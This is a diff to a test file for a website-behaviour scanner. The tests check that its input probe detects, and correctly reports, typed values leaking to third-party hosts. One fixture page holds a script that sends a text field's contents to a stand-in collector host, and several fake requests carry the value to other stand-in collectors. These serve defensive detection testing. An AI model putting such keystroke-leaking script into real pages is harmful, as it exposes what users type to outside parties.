@@ -1,4 +1,5 @@
 import assert from "node:assert/strict";
+import { createHash } from "node:crypto";
 import { readFile } from "node:fs/promises";
 import path from "node:path";
 import { createServer } from "node:http";
@@ -17,6 +18,7 @@ import { CONSENT_INTERACTION_LEFT_SUBJECT_WARNING } from "./consent-subject-loss
 import { PublicScanError } from "./public-errors";
 import { TCF_API_METHOD } from "./consent-verification";
 import { GPC_WORKER_CAPTURE_LOSS_WARNING, gpcWorkerCaptureLossCount } from "./gpc-injection";
+import { createSentinel, sentinelEncodings } from "./keystroke-exfiltration";
 import { MeasurementKernel } from "./measurement-kernel";
 import { buildScanConditions, buildScanResult } from "./scan-result-builder";
 import {
@@ -24,6 +26,7 @@ import {
   ScanNetworkRecorder, withScanDeadline } from "./scan-runtime";
 import type { FingerprintDetectionSummary } from "./types";
 import {
+  blockedNavigationMayCarrySentinel,
   boundedPolicyTextFromWire,
   browserProcessEnvironment,
   captureProbeRequest,
@@ -5395,15 +5398,12 @@ test("a child-frame navigation the input probe aborts leaves the request log and
   }
 });
 
-test("the probe's capture skips the navigations its route aborts and keeps everything else", async () => {
-  // The page route aborts a navigation's first hop while the probe runs, and
-  // never sees a redirect hop (Playwright routes only the first URL), so the
-  // capture must skip exactly the first hops: a hop the route never saw was
-  // sent and stays evidence.
+/**
+ * Run the probe over one fake text field whose typing emits the requests
+ * `requestsFor` builds from the typed value, and return its outcome.
+ */
+async function probeWithTypedRequests(requestsFor: (value: string) => unknown[]) {
   const listeners = new Set<(request: unknown) => void>();
-  const emit = (request: unknown) => {
-    for (const listener of listeners) listener(request);
-  };
   const handle = {
     async isVisible() {
       return true;
@@ -5432,24 +5432,9 @@ test("the probe's capture skips the navigations its route aborts and keeps every
     },
     async focus() {},
     async type(value: string) {
-      emit({
-        url: () => `https://nav-collector.example/frame?q=${value}`,
-        postData: () => null,
-        isNavigationRequest: () => true,
-        redirectedFrom: () => null
-      });
-      emit({
-        url: () => `https://hop-collector.example/landing?q=${value}`,
-        postData: () => null,
-        isNavigationRequest: () => true,
-        redirectedFrom: () => ({ url: () => "https://www.example.com/earlier" })
-      });
-      emit({
-        url: () => `https://beacon.example/collect?v=${value}`,
-        postData: () => null,
-        isNavigationRequest: () => false,
-        redirectedFrom: () => null
-      });
+      for (const request of requestsFor(value)) {
+        for (const listener of listeners) listener(request);
+      }
     },
     async dispose() {}
   };
@@ -5486,9 +5471,174 @@ test("the probe's capture skips the navigations its route aborts and keeps every
     "probe-navigation-collector",
     lifecycle
   );
+  assert.equal(listeners.size, 0, "the probe must retire its request listener");
+  return outcome;
+}
+
+test("the probe's capture skips the navigations its route aborts and keeps everything else", async () => {
+  // The page route aborts a navigation's first hop while the probe runs, and
+  // never sees a redirect hop (Playwright routes only the first URL), so the
+  // capture must skip exactly the first hops: a hop the route never saw was
+  // sent and stays evidence. The stopped first hop was carrying the value to a
+  // third party, so the probe cannot publish a complete result either.
+  const outcome = await probeWithTypedRequests((value) => [
+    {
+      url: () => `https://nav-collector.example/frame?q=${value}`,
+      postData: () => null,
+      isNavigationRequest: () => true,
+      redirectedFrom: () => null
+    },
+    {
+      url: () => `https://hop-collector.example/landing?q=${value}`,
+      postData: () => null,
+      isNavigationRequest: () => true,
+      redirectedFrom: () => ({ url: () => "https://www.example.com/earlier" })
+    },
+    {
+      url: () => `https://beacon.example/collect?v=${value}`,
+      postData: () => null,
+      isNavigationRequest: () => false,
+      redirectedFrom: () => null
+    }
+  ]);
+
+  assert.ok(outcome.status === "partial");
+  assert.equal(outcome.reason, "scan-failed");
+  assert.equal("captureLossCount" in outcome, false);
+  assert.ok(outcome.detection && outcome.detection.kind === "keystroke-exfiltration");
+  assert.deepEqual(outcome.detection.evidence.recipients, ["beacon.example", "hop-collector.example"]);
+});
+
+test("a stopped navigation that cannot carry the value to a third party leaves the probe complete", async () => {
+  // Search-as-you-type navigating the page itself, and an ad frame rotating
+  // during the wait, are stopped too. Neither could hand the value to a third
+  // party, so neither may censor the probe.
+  const outcome = await probeWithTypedRequests((value) => [
+    {
+      url: () => `https://www.example.com/search?q=${value}`,
+      postData: () => null,
+      isNavigationRequest: () => true,
+      redirectedFrom: () => null
+    },
+    {
+      url: () => "https://ads.example/rotate?slot=2",
+      postData: () => null,
+      isNavigationRequest: () => true,
+      redirectedFrom: () => null
+    },
+    {
+      url: () => `https://beacon.example/collect?v=${value}`,
+      postData: () => null,
+      isNavigationRequest: () => false,
+      redirectedFrom: () => null
+    }
+  ]);
 
   assert.equal(outcome.status, "complete");
   assert.ok(outcome.detection && outcome.detection.kind === "keystroke-exfiltration");
-  assert.deepEqual(outcome.detection.evidence.recipients, ["beacon.example", "hop-collector.example"]);
-  assert.equal(listeners.size, 0, "the probe must retire its request listener");
+  assert.deepEqual(outcome.detection.evidence.recipients, ["beacon.example"]);
 });
+
+test("a stopped navigation counts as carrying the value in any encoding, or when it cannot be read", () => {
+  const sentinel = createSentinel("0123456789ab");
+  const encodings = sentinelEncodings(sentinel);
+  const hex = Buffer.from(sentinel, "utf8").toString("hex");
+  const sha256 = createHash("sha256").update(sentinel).digest("hex");
+  const navigation = (url: string, postData: () => string | null = () => null) => ({ url: () => url, postData });
+  const carries = (request: ReturnType<typeof navigation>) =>
+    blockedNavigationMayCarrySentinel(request, encodings, "www.example.com");
+
+  assert.equal(carries(navigation(`https://collector.example.net/c?v=${sentinel}`)), true);
+  assert.equal(carries(navigation(`https://collector.example.net/c?h=${sha256.toUpperCase()}`)), true);
+  assert.equal(carries(navigation("https://collector.example.net/c", () => `v=${hex}`)), true);
+  // What a navigation carried is unknown when its body or URL was not read.
+  assert.equal(
+    carries(navigation("https://collector.example.net/c", () => {
+      throw new Error("unreadable body");
+    })),
+    true
+  );
+  assert.equal(carries(navigation(`https://collector.example.net/${"a".repeat(MAX_RECORDED_REQUEST_URL_CHARS)}`)), true);
+  assert.equal(
+    carries(navigation("https://collector.example.net/c", () => "x".repeat(MAX_CAPTURED_BODY_CHARS + 1))),
+    true
+  );
+  // First party, or no value: nothing a third party could have received.
+  assert.equal(carries(navigation(`https://www.example.com/search?q=${sentinel}`)), false);
+  assert.equal(carries(navigation("https://collector.example.net/c?v=other", () => "v=other")), false);
+});
+
+for (const variant of ["child-frame", "main-frame"] as const) {
+  test(`a ${variant} navigation the input probe stops while it carries the test value leaves the probe incomplete`, { timeout: 30_000 }, async () => {
+    // The stopped navigation never loaded, so it is not a leak and names no
+    // recipient. It was still the typed value on its way to a third party:
+    // published as a complete probe, the report allowed "no typed value left
+    // this page" over the one request that carried it, with nothing but a
+    // request-family loss behind it.
+    const paths: string[] = [];
+    const upstream = createServer((request, response) => {
+      paths.push(request.url ?? "");
+      response.writeHead(200, { "content-type": "text/html; charset=utf-8" });
+      response.end(`<!doctype html><title>Probe navigation carrying the value</title>
+        <input id="field"><iframe id="frame" src="about:blank"></iframe>
+        <script>field.addEventListener('blur', () => {
+          const target = 'http://collector.example.net/collect?v=' + encodeURIComponent(field.value);
+          ${variant === "main-frame" ? "location.href = target;" : "frame.src = target;"}
+        });</script>`);
+    });
+    await new Promise<void>((resolve, reject) => {
+      upstream.once("error", reject);
+      upstream.listen(0, "127.0.0.1", resolve);
+    });
+    const address = upstream.address();
+    assert.ok(address && typeof address === "object");
+    const previousConsentVerification = process.env.SITE_BEHAVIOR_LAB_CONSENT_VERIFICATION;
+    process.env.SITE_BEHAVIOR_LAB_CONSENT_VERIFICATION = "1";
+    try {
+      const visit = await scanSiteWithMeasurement(
+        { url: "http://probe-subject.example.com/", device: "desktop", gpcEnabled: false, consentMode: "observe" },
+        { publicUrlAlreadyVerified: true, verifyPublicUrl: async () => undefined,
+          resolvePublicHost: async () => [{ address: "93.184.216.34", family: 4 }],
+          connectProxyUpstreamForTests: () => connect(address.port, "127.0.0.1"), resolveCnameChain: async () => [] }
+      );
+      const { result, measurement } = visit;
+      assert.ok(measurement);
+      assert.ok(paths.every(path => !path.startsWith("/collect")), "the stopped navigation must never reach the network");
+      assert.ok(result.warnings.some(warning => warning.includes("Observed requests during typing")), "the probe typed");
+      // The page stayed on the subject, so this is not the subject-loss path.
+      assert.ok(result.warnings.every(warning => !warning.includes("left the recorded site before or during the active input probe")));
+      const activePhase = measurement.measurement.phases.find(phase => phase.kind === "active-probe");
+      assert.ok(activePhase);
+      assert.deepEqual(measurement.measurement.detectors["keystroke-exfiltration"], {
+        version: measurement.measurement.detectors["keystroke-exfiltration"].version,
+        status: "partial",
+        reason: "scan-failed",
+        phaseId: activePhase.phaseId
+      });
+      assert.ok(measurement.measurement.qualityFacts.captureLoss.some(loss =>
+        loss.family === "detector-output" && loss.detail === "keystroke-probe" && loss.phaseId === activePhase.phaseId
+      ));
+      assert.equal(result.fingerprintDetections?.some(detection => detection.kind === "keystroke-exfiltration") ?? false, false);
+
+      const facts = buildReportFacts(
+        viewFromV2(
+          toPublicScanReportR2(
+            buildRuntimeScanReportV2R2(visit, "public-api", {
+              SITE_BEHAVIOR_LAB_BUILD_COMMIT: "a".repeat(40)
+            } as NodeJS.ProcessEnv)
+          ),
+          2
+        )
+      );
+      const claim = facts.display.claims["keystroke-exfiltration"];
+      assert.equal(claim.allowed, false);
+      assert.ok(claim.blockers.includes("detector-incomplete"));
+      assert.ok(claim.blockers.includes("family-censored"));
+    } finally {
+      if (previousConsentVerification === undefined) delete process.env.SITE_BEHAVIOR_LAB_CONSENT_VERIFICATION;
+      else process.env.SITE_BEHAVIOR_LAB_CONSENT_VERIFICATION = previousConsentVerification;
+      await closeSharedBrowserForTests();
+      await new Promise<void>(resolve => upstream.close(() => resolve()));
+    }
+  });
+}
